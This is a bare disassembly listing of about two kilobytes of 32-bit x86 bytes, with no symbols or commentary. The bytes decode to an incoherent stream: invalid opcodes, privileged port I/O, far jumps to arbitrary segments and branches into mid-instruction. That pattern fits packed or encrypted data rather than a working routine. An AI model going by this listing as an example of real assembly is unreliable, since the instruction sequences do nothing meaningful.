  412ffc:	icebp  
  412ffd:	and    edx,ebp
  412fff:	mov    ch,0xba
  413001:	pop    es
  413002:	mov    ah,dh
  413004:	loopne 0x413017
  413006:	mov    al,BYTE PTR [edi]
  413008:	imul   edi,DWORD PTR [ecx+0x50],0x5fe9ff31
  41300f:	(bad)  
  413010:	es cdq 
  413012:	inc    ecx
  413013:	dec    ecx
  413014:	add    al,0x80
  413016:	jne    0x41304f
  413018:	xchg   esi,eax
  413019:	jnp    0x412fd3
  41301b:	(bad)  
  41301c:	in     eax,dx
  41301d:	jge    0x413090
  41301f:	sub    ch,BYTE PTR [ebp+0x4373612]
  413025:	addr16 pop edi
  413027:	mov    ch,0x2f
  413029:	mov    dl,BYTE PTR [ebx+ebp*2-0x1c931e09]
  413030:	lds    esi,FWORD PTR [esp+edi*4+0x78]
  413034:	add    al,0xbb
  413036:	push   ebp
  413037:	push   esp
  413038:	gs or  edi,esp
  41303b:	xchg   ecx,eax
  41303c:	sub    BYTE PTR [edi],ch
  41303e:	lea    eax,[ebx+0x25719ff5]
  413044:	pop    ebx
  413045:	sub    DWORD PTR [esi+0x5ff0ae07],ebp
  41304b:	nop
  41304c:	out    dx,eax
  41304d:	sahf   
  41304e:	fild   DWORD PTR [ebx+0x7eec6ce7]
  413054:	push   ebx
  413055:	ja     0x41306a
  413057:	jl     0x412ff8
  413059:	mov    esp,0xbc3cfac1
  41305e:	xchg   esi,eax
  41305f:	(bad)  
  413060:	das    
  413061:	fld    QWORD PTR [eax]
  413063:	push   eax
  413064:	add    ch,BYTE PTR [ebp+ebp*1-0x48]
  413068:	fwait
  413069:	push   ecx
  41306a:	shl    BYTE PTR [eax-0x269a1b75],1
  413070:	cmp    DWORD PTR [ebx-0x14c72677],0xffffffd7
  413077:	or     al,0x6
  413079:	mov    edi,DWORD PTR [eax-0x7e]
  41307c:	and    DWORD PTR ds:[edi+0x47],0xffffffd2
  413081:	and    edi,esi
  413083:	(bad)  [esi+edx*8+0x14]
  413087:	test   DWORD PTR [edx+0x16],ebp
  41308a:	sbb    al,0x7e
  41308c:	out    dx,eax
  41308d:	mov    edi,0xf3f660fa
  413092:	and    DWORD PTR [esi],ebp
  413094:	cmp    bh,BYTE PTR [ebx+edi*8+0x601efbba]
  41309b:	fs ins BYTE PTR es:[edi],dx
  41309d:	xor    bl,0xce
  4130a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4130a1:	mov    bh,0x4
  4130a3:	mov    cs,WORD PTR [ecx-0x6872c67d]
  4130a9:	sahf   
  4130aa:	jns    0x413116
  4130ac:	push   0x49
  4130ae:	adc    al,0xf4
  4130b0:	imul   eax,esi,0x45
  4130b3:	cwde   
  4130b4:	jo     0x41306f
  4130b6:	rol    DWORD PTR [edi],1
  4130b8:	sub    BYTE PTR cs:[ebx],dh
  4130bb:	outs   dx,BYTE PTR ds:[esi]
  4130bc:	cli    
  4130bd:	repnz data16 lahf 
  4130c0:	push   eax
  4130c1:	sbb    esp,DWORD PTR [esi+ebx*4-0x11]
  4130c5:	mov    ds:0xb67b6def,al
  4130ca:	in     al,0x28
  4130cc:	pop    edi
  4130cd:	dec    esp
  4130ce:	jns    0x413143
  4130d0:	and    al,0x1
  4130d2:	idiv   BYTE PTR [ebp+0x5b]
  4130d5:	dec    edx
  4130d6:	test   eax,0x4e9d2db5
  4130db:	pop    edx
  4130dc:	push   ds
  4130dd:	mov    dl,0x79
  4130df:	jecxz  0x41308d
  4130e1:	or     al,BYTE PTR [edi]
  4130e3:	cmp    DWORD PTR [esi+eax*4-0x5c86c202],ecx
  4130ea:	pushf  
  4130eb:	pop    es
  4130ec:	jmp    0x150e:0xb6b023da
  4130f3:	jge    0x4130d1
  4130f5:	and    eax,0x69e6a520
  4130fa:	xor    ecx,edx
  4130fc:	ja     0x41308d
  4130fe:	imul   bx,WORD PTR [edi+0x39a17fca],0xffbd
  413106:	lds    esp,FWORD PTR [edi]
  413108:	aas    
  413109:	fs call 0x6881dd8b
  41310f:	sbb    ebx,DWORD PTR [esi-0x37]
  413112:	outs   dx,BYTE PTR ds:[esi]
  413113:	or     bl,BYTE PTR [esi-0x64a172a0]
  413119:	sub    dh,al
  41311b:	imul   edi,ebp,0xb3e1ebb4
  413121:	pop    edx
  413122:	inc    ecx
  413123:	loope  0x4130f0
  413125:	inc    ebp
  413126:	call   0x72e2:0x937da515
  41312d:	push   ebp
  41312e:	shr    DWORD PTR [eax-0x5c6f25a9],1
  413134:	xchg   edx,eax
  413135:	jae    0x413171
  413137:	push   esi
  413138:	test   DWORD PTR [esp+edi*1+0x280655a],eax
  41313f:	and    BYTE PTR [esi],0xbf
  413142:	xchg   edi,eax
  413143:	std    
  413144:	rcl    BYTE PTR [esi-0x31],cl
  413147:	call   0xa666:0xfc032fe5
  41314e:	ret    
  41314f:	js     0x413124
  413151:	mov    ds:0xfcd4573f,al
  413156:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413157:	push   ebx
  413158:	adc    edi,DWORD PTR [edi]
  41315a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41315b:	cmp    BYTE PTR [ebx-0x31],ah
  41315e:	and    ebx,eax
  413160:	or     bl,dh
  413162:	ins    DWORD PTR es:[edi],dx
  413163:	imul   esp,DWORD PTR [edi],0x1ea2a1bf
  413169:	ins    BYTE PTR es:[edi],dx
  41316a:	pop    ss
  41316b:	dec    ebx
  41316c:	mov    eax,ds:0x24b1404a
  413171:	sub    ah,0xf2
  413174:	adc    esp,DWORD PTR [eax+0x4]
  413177:	add    ch,BYTE PTR [eax+esi*1+0x5c]
  41317b:	out    dx,al
  41317c:	mov    edx,0xcc1ac992
  413181:	fisub  DWORD PTR [ebx-0x4691a410]
  413187:	out    dx,eax
  413188:	inc    ebp
  413189:	cmc    
  41318a:	cmp    BYTE PTR ds:0xc190aec6,dl
  413190:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413191:	aam    0xda
  413193:	push   edx
  413194:	sub    BYTE PTR [ebp+0x170fd3b5],dl
  41319a:	int    0x83
  41319c:	xchg   DWORD PTR ss:0xa456391f,esi
  4131a3:	int3   
  4131a4:	cmp    cl,BYTE PTR [edi+0x23]
  4131a7:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  4131a9:	adc    al,0xc9
  4131ab:	lahf   
  4131ac:	jo     0x41314c
  4131ae:	popf   
  4131af:	retf   
  4131b0:	jns    0x413162
  4131b2:	mov    dh,0x60
  4131b4:	mov    BYTE PTR [edi-0x6f5a1487],ah
  4131ba:	div    DWORD PTR [ebx-0x102d4ff6]
  4131c0:	xor    BYTE PTR [eax-0x4e],0xdf
  4131c4:	mov    ebp,0xbaafb92f
  4131c9:	ins    DWORD PTR es:[edi],dx
  4131ca:	jle    0x4131cb
  4131cc:	jmp    0x4131f8
  4131ce:	loope  0x41323f
  4131d0:	in     eax,0xb2
  4131d2:	retf   
  4131d3:	retf   0x9af6
  4131d6:	push   ds
  4131d7:	inc    esi
  4131d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4131d9:	jnp    0x413216
  4131db:	mov    dl,0xb0
  4131dd:	sub    eax,0xaef0a073
  4131e2:	jge    0x413215
  4131e4:	mov    dl,0x1d
  4131e6:	lods   eax,DWORD PTR ds:[esi]
  4131e7:	adc    DWORD PTR [ecx+0x32],esi
  4131ea:	cs sbb eax,edi
  4131ed:	ins    DWORD PTR es:[edi],dx
  4131ee:	mov    ebx,0xd9f9a6a7
  4131f3:	out    dx,eax
  4131f4:	mov    ah,0x5
  4131f6:	(bad)  
  4131f7:	mov    edi,0x8b428b2c
  4131fc:	mov    al,ds:0x8585bd31
  413201:	ins    BYTE PTR es:[edi],dx
  413202:	(bad)  
  413203:	inc    ebp
  413204:	xchg   ecx,eax
  413205:	xor    BYTE PTR [edx+0x4],bh
  413208:	adc    dl,0x75
  41320b:	ds push eax
  41320d:	push   0x199f320a
  413212:	mov    al,ds:0x4d92d37e
  413217:	mov    WORD PTR [eax-0x4eb06bf8],ss
  41321d:	pop    ebp
  41321e:	cmp    al,0x99
  413220:	fsubr  QWORD PTR fs:[ebx+0x5e7c1351]
  413227:	leave  
  413228:	pusha  
  413229:	inc    eax
  41322a:	lods   al,BYTE PTR ds:[esi]
  41322b:	adc    edx,esi
  41322d:	mov    ebx,0x68264b7f
  413232:	nop
  413233:	dec    esp
  413234:	mov    edx,0x18c01793
  413239:	and    BYTE PTR [eax-0x3beea3c3],cl
  41323f:	sbb    ebx,esi
  413241:	cdq    
  413242:	retf   0xe3f2
  413245:	icebp  
  413246:	out    dx,eax
  413247:	les    ebx,FWORD PTR [ecx+edx*4-0x53521a67]
  41324e:	push   cs
  41324f:	jae    0x413299
  413251:	outs   dx,DWORD PTR ds:[esi]
  413252:	cli    
  413253:	test   DWORD PTR [esi],esi
  413255:	test   eax,0xd3f4fbcc
  41325a:	cmc    
  41325b:	fist   WORD PTR [edx]
  41325d:	pop    esi
  41325e:	adc    ecx,DWORD PTR [eax+0x910bcbc]
  413264:	retf   0xed6e
  413267:	jle    0x413283
  413269:	je     0x413248
  41326b:	adc    DWORD PTR [edx+0x2f49eb90],ebx
  413271:	retf   0x5b69
  413274:	xchg   ebx,eax
  413275:	cmovns ebx,ecx
  413278:	xchg   BYTE PTR [ebx+edx*8],cl
  41327b:	loopne 0x413249
  41327d:	and    al,0x11
  41327f:	nop
  413280:	mov    esp,0x1ae7f9c5
  413285:	ja     0x4132a4
  413287:	adc    esp,DWORD PTR [edx+edx*4+0x2c411f38]
  41328e:	jmp    0x413290
  413290:	pop    ebp
  413291:	add    dl,bl
  413293:	or     al,BYTE PTR [ebx-0x7c5134ec]
  413299:	call   0x4b9df26
  41329e:	pop    esp
  41329f:	xor    BYTE PTR [ebx-0x22060a6e],al
  4132a5:	inc    edi
  4132a6:	fstp   DWORD PTR [ebx]
  4132a8:	sub    cl,BYTE PTR [ebp-0x42]
  4132ab:	sbb    ecx,edi
  4132ad:	xor    ebp,esp
  4132af:	dec    esi
  4132b0:	sbb    DWORD PTR [esi+0x2e],0x27a7e940
  4132b7:	retw   
  4132b9:	rcl    DWORD PTR [ebx+0x41e3890c],cl
  4132bf:	push   0x24bbafee
  4132c4:	rol    DWORD PTR [ebx],cl
  4132c6:	cwde   
  4132c7:	pop    edx
  4132c8:	icebp  
  4132c9:	or     DWORD PTR [ebx+ebp*1-0xd30e529],edi
  4132d0:	js     0x41329a
  4132d2:	rol    BYTE PTR [edx-0xb06e9c9],cl
  4132d8:	cmc    
  4132d9:	ret    0xc0ca
  4132dc:	push   esp
  4132dd:	dec    ebx
  4132de:	jg     0x413324
  4132e0:	mov    dh,0xe1
  4132e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4132e3:	ror    al,1
  4132e5:	(bad)  
  4132e6:	(bad)  [edx+0x76]
  4132e9:	xor    BYTE PTR [eax+eiz*8],ah
  4132ec:	call   0x1ffa:0x9d86b557
  4132f3:	gs addr16 push eax
  4132f6:	push   esi
  4132f7:	mov    cl,0xab
  4132f9:	pop    ss
  4132fa:	push   0xffffffe2
  4132fc:	cwde   
  4132fd:	std    
  4132fe:	loopne 0x41337d
  413300:	pop    ecx
  413301:	cwde   
  413302:	repz sub edi,0xb
  413306:	arpl   WORD PTR ds:0x13a26ecb,dx
  41330c:	repnz push ss
  41330e:	dec    edi
  41330f:	gs inc eax
  413311:	js     0x4132c5
  413313:	aas    
  413314:	addr16 jl 0x4132a2
  413317:	or     dl,dl
  413319:	sbb    BYTE PTR [ecx],bl
  41331b:	mov    ecx,0xe4e95bb
  413320:	adc    al,0x42
  413322:	pop    esp
  413323:	and    ch,cl
  413325:	mov    esi,ebx
  413327:	or     eax,0x3a70a4a7
  41332c:	aaa    
  41332d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41332e:	ret    
  41332f:	cmp    DWORD PTR [esi+ecx*2+0x14],esp
  413333:	pop    ecx
  413334:	push   cs
  413335:	push   ecx
  413336:	(bad)  
  413337:	pusha  
  413338:	cmc    
  413339:	and    ebp,DWORD PTR [edx]
  41333b:	rol    DWORD PTR [ecx],1
  41333d:	jl     0x4132f7
  41333f:	sub    BYTE PTR [ecx+0x58093599],0x3a
  413346:	test   DWORD PTR [edi-0x4ab0125b],0xf06b3839
  413350:	or     DWORD PTR [ecx-0x7],ebp
  413353:	sbb    BYTE PTR [edx-0x7a09550a],bl
  413359:	cwde   
  41335a:	outs   dx,DWORD PTR ds:[esi]
  41335b:	sub    ch,0xe5
  41335e:	dec    ebx
  41335f:	adc    cl,ah
  413361:	adc    DWORD PTR [ebp+0x65],edi
  413364:	and    eax,0x61116eb
  413369:	mov    edx,0xd6515515
  41336e:	fidivr WORD PTR ds:0x4065be28
  413374:	jp     0x4133ad
  413376:	js     0x413321
  413378:	rol    DWORD PTR [ebx+0x2e4ff1be],1
  41337e:	fisub  DWORD PTR [esi-0x3ab5b508]
  413384:	mov    ds:0x8ac521a1,eax
  413389:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41338a:	(bad)  
  41338b:	loopne 0x4133b1
  41338d:	add    ebx,eax
  41338f:	xchg   BYTE PTR [ecx],cl
  413391:	cmp    eax,0x921079b7
  413396:	push   0xffffffbb
  413398:	pop    ebx
  413399:	shl    BYTE PTR [edi+0xd21735],cl
  41339f:	adc    ebp,DWORD PTR [edi-0x6bf5e6ec]
  4133a5:	dec    ebp
  4133a6:	jle    0x41341f
  4133a8:	(bad)  
  4133aa:	and    DWORD PTR [esi+ebx*1-0x43],esp
  4133ae:	fcmove st,st(1)
  4133b0:	push   ds
  4133b1:	mov    ebp,0x87320752
  4133b6:	xchg   ebx,eax
  4133b7:	(bad)  
  4133b8:	div    BYTE PTR [ebx-0x12]
  4133bb:	xor    ecx,DWORD PTR [ebx-0x42]
  4133be:	ins    DWORD PTR es:[edi],dx
  4133bf:	imul   esp,DWORD PTR [ebp-0x6c4610b],0xffffffa8
  4133c6:	call   0x858ea454
  4133cb:	dec    ebp
  4133cc:	mov    dl,0x9f
  4133ce:	out    dx,eax
  4133cf:	mov    bl,BYTE PTR [ecx+0x27]
  4133d2:	cmc    
  4133d3:	and    eax,0x5604ef75
  4133d8:	jno    0x4133ae
  4133da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4133db:	adc    al,0x6a
  4133dd:	call   FWORD PTR [edx]
  4133df:	ins    DWORD PTR es:[edi],dx
  4133e0:	xchg   ecx,eax
  4133e1:	dec    edx
  4133e2:	js     0x4133cf
  4133e4:	lock gs or cl,dl
  4133e8:	in     eax,dx
  4133e9:	shr    cl,0xe3
  4133ec:	pop    esi
  4133ed:	dec    esp
  4133ee:	dec    DWORD PTR [esi]
  4133f0:	mov    edx,edi
  4133f2:	out    dx,eax
  4133f3:	fistp  QWORD PTR [edi-0x76a87da7]
  4133f9:	push   ss
  4133fa:	out    dx,eax
  4133fb:	rcl    DWORD PTR [ecx+edx*8],1
  4133fe:	cmp    DWORD PTR [edi],ebx
  413400:	or     DWORD PTR ds:0x6d1d0467,edx
  413406:	clc    
  413407:	jnp    0x41341b
  413409:	pop    es
  41340a:	jmp    0x28f7:0x78bf7401
  413411:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413412:	shl    DWORD PTR [ebp+0x72002690],1
  413418:	mov    ebp,0x7af1fa74
  41341d:	in     al,dx
  41341e:	cli    
  41341f:	or     ebx,DWORD PTR [edi]
  413421:	xchg   edx,eax
  413422:	jecxz  0x41342f
  413424:	dec    edx
  413425:	int    0xb7
  413427:	or     BYTE PTR [ebp-0x29],ah
  41342a:	iret   
  41342b:	mov    WORD PTR [eax-0x2b],cs
  41342e:	adc    BYTE PTR [eax-0x6f],ch
  413431:	jb     0x41342f
  413433:	push   esp
  413434:	cmp    esp,DWORD PTR [ebp+0x781b0003]
  41343a:	retf   0xd1e0
  41343d:	(bad)  
  41343e:	push   esi
  41343f:	sbb    DWORD PTR [esi-0x45],ebp
  413442:	sub    edi,DWORD PTR [esi-0x2748652d]
  413448:	adc    DWORD PTR [ecx],esi
  41344a:	or     esi,DWORD PTR [edx]
  41344c:	and    bh,BYTE PTR [si]
  41344f:	cli    
  413450:	aad    0x68
  413452:	jle    0x4133d4
  413454:	ja     0x41349a
  413456:	inc    esp
  413457:	pushf  
  413458:	fdivr  st(4),st
  41345a:	retf   0x8c66
  41345d:	push   ecx
  41345e:	leave  
  41345f:	push   edi
  413460:	in     al,0xfb
  413462:	loop   0x4133ff
  413464:	xchg   ebx,eax
  413465:	loop   0x4134c3
  413467:	push   0xe602e7f2
  41346c:	push   cs
  41346d:	sbb    DWORD PTR [edx+edx*8],ecx
  413470:	cmp    al,0x70
  413472:	cwde   
  413473:	sub    al,ah
  413475:	inc    edx
  413476:	xor    eax,0x696b45bc
  41347b:	sti    
  41347c:	gs pop ebx
  41347e:	lea    edi,[edx+0x1cc5dd5a]
  413484:	xchg   edx,eax
  413485:	ds inc ebx
  413487:	dec    ecx
  413488:	int3   
  413489:	jno    0x4134d3
  41348b:	xchg   ebx,eax
  41348c:	add    al,0xb1
  41348e:	sub    BYTE PTR [ecx-0x4a2a3a9e],dh
  413494:	gs mov bh,0x66
  413497:	repnz rcr DWORD PTR [ebx-0x661f32df],cl
  41349e:	ror    DWORD PTR [ebx-0x1f],cl
  4134a1:	fisub  DWORD PTR [eax]
  4134a3:	sti    
  4134a4:	jno    0x4134d4
  4134a6:	or     DWORD PTR [esp+edx*4+0x58332719],esi
  4134ad:	mov    cl,0x93
  4134af:	js     0x413476
  4134b1:	repnz enter 0x54b8,0xd2
  4134b6:	jmp    0x5ed9d38c
  4134bb:	xor    BYTE PTR [eax-0x55519552],al
  4134c1:	out    0x35,eax
  4134c3:	(bad)  [edi+0x5f11ff29]
  4134c9:	mov    edi,0x1aafa1b5
  4134ce:	push   ebx
  4134cf:	repz mov bl,BYTE PTR [ebp+esi*8-0x80]
  4134d4:	mov    eax,ds:0x74c45dc2
  4134d9:	sbb    al,0x17
  4134db:	cwde   
  4134dc:	aaa    
  4134dd:	stos   BYTE PTR es:[edi],al
  4134de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4134df:	inc    edx
  4134e0:	lahf   
  4134e1:	dec    ebx
  4134e2:	loopne 0x4134bc
  4134e4:	(bad)  
  4134e5:	push   esi
  4134e6:	icebp  
  4134e7:	push   ebx
  4134e8:	js     0x413536
  4134ea:	dec    ebp
  4134eb:	push   ebx
  4134ec:	clc    
  4134ed:	or     bx,WORD PTR [edx]
  4134f0:	aas    
  4134f1:	jge    0x4134b4
  4134f3:	ret    
  4134f4:	mov    ebx,0x8f93d261
  4134f9:	and    ah,BYTE PTR [ebx]
  4134fb:	pop    esp
  4134fc:	leave  
  4134fd:	add    BYTE PTR [edx-0x7c95227e],bl
  413503:	pushf  
  413504:	fst    QWORD PTR ds:0x5968ba8c
  41350a:	inc    edx
  41350b:	out    0x27,al
  41350d:	inc    esi
  41350e:	pop    es
  41350f:	push   ss
  413510:	retf   
  413511:	cmp    eax,0x9d6e6df7
  413516:	in     eax,dx
  413517:	jg     0x41354b
  413519:	test   DWORD PTR [edi],0x28584463
  41351f:	dec    esi
  413520:	mov    bh,0x39
  413522:	aam    0x1d
  413524:	ds mov dl,0x48
  413527:	scas   al,BYTE PTR es:[edi]
  413528:	mov    ecx,0x48377920
  41352d:	test   eax,0x121bfb46
  413532:	pop    eax
  413533:	nop
  413534:	sub    eax,0x6489b057
  413539:	mov    esi,0x3674250c
  41353e:	cmp    al,0xe8
  413540:	fidivr DWORD PTR [ebx+0xdc90ca]
  413546:	push   ecx
  413547:	jno    0x4134d1
  413549:	sbb    al,0xda
  41354b:	add    dl,BYTE PTR [eax+0x6e]
  41354e:	adc    DWORD PTR [edi],ecx
  413550:	sbb    dl,BYTE PTR [edx-0x30]
  413553:	sbb    ebx,DWORD PTR [ebx+0x42]
  413556:	or     ebx,DWORD PTR [ecx-0x517db35e]
  41355c:	leave  
  41355d:	jns    0x4135aa
  41355f:	push   ebx
  413560:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413561:	jne    0x413568
  413563:	push   0x56
  413565:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413566:	mov    edx,0xbc101550
  41356b:	xchg   BYTE PTR [eax],dh
  41356d:	(bad)  
  41356e:	adc    BYTE PTR [esi-0x1d],al
  413571:	call   0x220eaea
  413576:	sbb    DWORD PTR [edi+edx*1-0x1a],0xfffffffb
  41357b:	push   cs
  41357c:	outs   dx,BYTE PTR ds:[esi]
  41357d:	inc    BYTE PTR gs:[ecx]
  413580:	lahf   
  413581:	imul   ebx,DWORD PTR [esi+eiz*4+0x661a5986],0x63
  413589:	fisubr DWORD PTR [edi+0x7cf01990]
  41358f:	test   al,0x12
  413591:	test   al,0x55
  413593:	nop
  413594:	rcr    edx,0x31
  413597:	into   
  413598:	(bad)  
  413599:	sub    ah,BYTE PTR [ebx+ecx*1+0x38]
  41359d:	push   ebp
  41359e:	aam    0x8c
  4135a0:	fwait
  4135a1:	xchg   esp,esi
  4135a3:	loope  0x413556
  4135a5:	arpl   WORD PTR [ebp-0x5c],ax
  4135a8:	or     bl,dh
  4135aa:	or     ebp,ecx
  4135ac:	ret    0x86c7
  4135af:	dec    ebx
  4135b0:	aad    0x2
  4135b2:	cwde   
  4135b3:	pop    es
  4135b4:	inc    eax
  4135b5:	js     0x413635
  4135b7:	dec    ebp
  4135b8:	and    bh,al
  4135ba:	adc    BYTE PTR [esi-0x3c],dh
  4135bd:	mov    ch,BYTE PTR [edi-0xd54f5a2]
  4135c3:	ret    0x6af6
  4135c6:	mov    eax,ds:0x4d18e5bc
  4135cb:	cdq    
  4135cc:	add    bh,BYTE PTR [ecx+edi*2+0x73b3546c]
  4135d3:	das    
  4135d4:	inc    esp
  4135d5:	sub    eax,0x43427a21
  4135da:	faddp  st(5),st
  4135dc:	lds    esi,FWORD PTR [edi+eiz*2-0x35]
  4135e0:	cli    
  4135e1:	es mov cl,0x8e
  4135e4:	in     al,0x6e
  4135e6:	sbb    bl,0x90
  4135e9:	cmp    cl,BYTE PTR [eax-0x342099c2]
  4135ef:	mov    BYTE PTR [ecx],cl
  4135f1:	fsub   QWORD PTR [ebp+0x31bd782d]
  4135f7:	dec    ebp
  4135f8:	call   0xfd64ca3e
  4135fd:	push   ss
  4135fe:	fdiv   QWORD PTR [edx]
  413600:	test   eax,0x851e5f04
  413605:	mov    ecx,0x2f39b021
  41360a:	rol    ecx,cl
  41360c:	in     al,0x1a
  41360e:	and    BYTE PTR [ebx-0x19],0x11
  413612:	sbb    BYTE PTR [ecx+0x21],ah
  413615:	push   ds
  413616:	sub    eax,0x11c8357
  41361b:	dec    ecx
  41361c:	sbb    al,BYTE PTR [eax]
  41361e:	out    dx,eax
  41361f:	lds    edi,FWORD PTR [edi+0x31a0b6a3]
  413625:	shr    BYTE PTR [ebx-0x39],0xef
  413629:	jle    0x413647
  41362b:	xchg   edx,eax
  41362c:	ucomiss xmm4,DWORD PTR ds:0xcebeffde
  413633:	mov    eax,0xe1b7eb5c
  413638:	popa   
  413639:	ret    
  41363a:	cs cld 
  41363c:	popf   
  41363d:	mov    bl,BYTE PTR [edi-0x55]
  413640:	adc    eax,DWORD PTR [eax-0x22]
  413643:	pop    ecx
  413644:	cli    
  413645:	(bad)  
  413646:	lods   eax,DWORD PTR ds:[esi]
  413647:	pop    ebp
  413648:	mov    edx,0x16956e5a
  41364d:	hlt    
  41364e:	loopne 0x41364c
  413650:	pop    ds
  413651:	dec    edi
  413652:	xor    DWORD PTR [edi-0x61],esp
  413655:	cmp    cl,bh
  413657:	js     0x413628
  413659:	out    dx,eax
  41365a:	shr    BYTE PTR ds:[esi+edx*8+0x4e30cc48],0x9b
  413663:	frstor [edi-0x4ee55533]
  413669:	inc    ecx
  41366a:	jmp    0x51af:0xaed28ad3
  413671:	pop    es
  413672:	aas    
  413673:	adc    BYTE PTR [ebx-0x74],0x89
  413677:	sbb    dh,ah
  413679:	shl    DWORD PTR [edi+0x77],1
  41367c:	adc    dl,0x55
  41367f:	or     BYTE PTR [edx+edx*1-0x39],dl
  413683:	mov    ds:0x767aaf83,eax
  413688:	pushf  
  413689:	cmp    al,0xaa
  41368b:	inc    esi
  41368c:	mov    ch,0xc4
  41368e:	or     DWORD PTR [ecx],edx
  413690:	xchg   esp,eax
  413691:	test   al,0x5e
  413693:	lahf   
  413694:	pop    esp
  413695:	cmp    eax,0x57e7b3be
  41369a:	rol    DWORD PTR [edi-0x430a0097],cl
  4136a0:	inc    esp
  4136a1:	sbb    bh,BYTE PTR [esi+0x47]
  4136a4:	jecxz  0x413676
  4136a6:	repnz xchg esi,eax
  4136a8:	lods   al,BYTE PTR ds:[esi]
  4136a9:	popa   
  4136aa:	adc    eax,0xe32aec39
  4136af:	jp     0x41364a
  4136b1:	pop    ecx
  4136b2:	mov    DWORD PTR [esi+ecx*8-0x1],0x18ad2afe
  4136ba:	push   edx
  4136bb:	inc    ecx
  4136bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4136bd:	sti    
  4136be:	dec    eax
  4136bf:	dec    ecx
  4136c0:	adc    eax,0x5d543800
  4136c5:	mov    ch,0xd
  4136c7:	ret    0x6173
  4136ca:	pop    ss
  4136cb:	pop    esp
  4136cc:	or     ebx,edi
  4136ce:	js     0x4136a9
  4136d0:	mov    bl,0x64
  4136d2:	jmp    0x16bc:0xa17966f8
  4136d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4136da:	jp     0x41366d
  4136dc:	mov    edx,ecx
  4136de:	dec    ebp
  4136df:	push   esi
  4136e0:	sbb    eax,ecx
  4136e2:	jmp    0x60056196
  4136e7:	mov    DWORD PTR ds:0xed1de8ae,ecx
  4136ed:	adc    eax,0x9abcb8d
  4136f2:	jae    0x413728
  4136f4:	mov    bl,0x4c
  4136f6:	std    
  4136f7:	and    eax,0x63eaefbf
  4136fc:	sahf   
  4136fd:	jg     0x41368a
  4136ff:	jnp    0x4136a9
  413701:	repz pop ebp
  413703:	(bad)  
  413704:	loop   0x413727
  413706:	adc    DWORD PTR [ebx],0x52
  413709:	ficom  WORD PTR [eax+0x18]
  41370c:	pop    eax
  41370d:	test   al,0x22
  41370f:	jo     0x4136be
  413711:	dec    eax
  413712:	dec    edx
  413713:	and    al,0xa8
  413715:	xor    cl,ah
  413717:	xor    eax,0x922dd55
  41371c:	in     eax,dx
  41371d:	jle    0x413786
  41371f:	mov    ecx,0x1af806b1
  413724:	xchg   esi,eax
  413725:	xor    DWORD PTR [edi],0x7195eb3a
  41372b:	out    0x70,eax
  41372d:	aas    
  41372e:	inc    ebp
  41372f:	enter  0x8c08,0x80
  413733:	mov    eax,ds:0x76d66f79
  413738:	stc    
  413739:	sahf   
  41373a:	adc    BYTE PTR [ecx],dl
  41373c:	ret    0xf519
  41373f:	repz dec eax
  413741:	imul   eax,DWORD PTR [ebp+0x603810d4],0xb267d017
  41374b:	je     0x41375d
  41374d:	sbb    edx,DWORD PTR [ebx+0x4b029523]
  413753:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413754:	dec    edi
  413755:	outs   dx,BYTE PTR ds:[esi]
  413756:	in     al,dx
  413757:	jg     0x413739
  413759:	adc    eax,0x4140e2c3
  41375e:	mov    esp,0xc77aa90c
  413763:	and    al,0x65
  413765:	lods   eax,DWORD PTR ds:[esi]
  413766:	test   eax,0x30a571cb
  41376b:	inc    ebx
  41376c:	or     dl,0x57
  41376f:	cmp    BYTE PTR [edi+0xeb792ee],bl
  413775:	loope  0x41377d
  413777:	mov    dl,0xb6
  413779:	xor    bh,BYTE PTR [ebx]
  41377b:	push   ds
  41377c:	ror    BYTE PTR [ebx],cl
  41377e:	retf   
  41377f:	test   al,0x36
  413781:	jnp    0x413773
  413783:	scas   eax,DWORD PTR es:[edi]
  413784:	add    BYTE PTR [eax+0x57],cl
  413787:	cmp    eax,0xcf35d329
  41378c:	and    edi,DWORD PTR [esi+0x5c]
  41378f:	mov    al,0xe8
  413791:	xor    DWORD PTR [edx+edi*2],ebx
  413794:	(bad)  
  413795:	adc    BYTE PTR [ebx],dl
  413797:	ja     0x413783
  413799:	fild   WORD PTR [edx-0x51]
  41379c:	loope  0x4137f6
  41379e:	pop    esi
  41379f:	pop    DWORD PTR [edi+0x44]
  4137a2:	andnps xmm7,XMMWORD PTR [ebx-0x11082615]
  4137a9:	push   esi
  4137aa:	mov    dl,0x62
  4137ac:	cld    
  4137ad:	je     0x41378f
  4137af:	hlt    
  4137b0:	push   ds
  4137b1:	clc    
  4137b2:	and    bh,ch
  4137b4:	(bad)  
  4137b6:	sbb    al,0x96
  4137b8:	xor    bh,al
  4137ba:	jnp    0x4137fa
  4137bc:	popa   
  4137bd:	sbb    DWORD PTR [bp+di-0x58ac],ebp
  4137c2:	call   0xf0ee:0x89b47678
  4137c9:	out    0x5e,eax
  4137cb:	jl     0x4137d4
  4137cd:	nop
  4137ce:	mov    BYTE PTR [esi-0x2467d3f],cl
  4137d4:	and    al,bl
  4137d6:	push   ecx
  4137d7:	int3   
  4137d8:	arpl   di,ax
  4137da:	ja     0x413791
  4137dc:	push   esp
  4137dd:	xchg   DWORD PTR [edi],ecx
  4137df:	pop    edx
  4137e0:	dec    edi
  4137e1:	push   esi
  4137e2:	sbb    esi,ebp
  4137e4:	bound  esp,QWORD PTR [esi]
  4137e6:	fcmovb st,st(6)
  4137e8:	sub    al,0x82
  4137ea:	mov    ?,WORD PTR [edx+0x7]
  4137ed:	jle    0x413810
  4137ef:	mov    eax,ds:0x8468151b
  4137f4:	adc    eax,0xc331f3fc
